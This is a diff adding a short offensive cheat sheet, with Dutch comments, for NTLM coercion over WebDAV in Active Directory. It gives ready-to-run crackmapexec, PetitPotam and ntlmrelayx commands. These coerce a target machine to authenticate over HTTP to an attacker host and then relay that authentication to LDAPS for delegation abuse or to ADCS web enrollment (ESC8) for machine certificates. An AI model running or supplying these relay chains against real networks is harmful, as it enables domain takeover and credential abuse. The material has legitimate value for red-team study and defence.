@@ -1,0 +1,36 @@
+# WebDAV Coercion — NTLM coercion via HTTP (WebClient service)
+# Converteert SMB coercion naar HTTP, omzeilt SMB signing
+# Cruciaal voor NTLM relay naar LDAP(S) en ADCS
+#
+# === Vereisten ===
+# - WebClient service actief op doelwit (standaard uit op servers)
+# - Domain user credentials
+#
+# === Voorbeelden ===
+
+# Check of WebClient service actief is
+crackmapexec smb TARGET_IP -u USER -p 'PASS' -M webdav
+
+# WebClient service activeren via SearchConnector
+# Maak .searchConnector-ms bestand dat WebClient triggert
+python3 webclientservicescanner.py DOMAIN/USER:'PASS'@TARGET_IP
+
+# Coercion via PetitPotam naar WebDAV (HTTP)
+# Let op: gebruik @80 poort om HTTP af te dwingen
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER_HOSTNAME@80/test TARGET_IP
+
+# Relay chain: WebDAV coercion → LDAP → RBCD
+# Terminal 1:
+python3 ntlmrelayx.py -t ldaps://DC_IP --delegate-access -smb2support
+# Terminal 2:
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER@80/a TARGET_IP
+
+# Relay chain: WebDAV coercion → ADCS (ESC8)
+# Terminal 1:
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template Machine
+# Terminal 2:
+python3 PetitPotam.py -u USER -p 'PASS' -d DOMAIN ATTACKER@80/a TARGET_IP
+
+# Noot: WebDAV stuurt HTTP auth, niet SMB — omzeilt SMB signing
+# Noot: WebClient is standaard UIT op servers, AAN op workstations
+# Noot: SearchConnector-ms bestanden triggeren WebClient automatisch
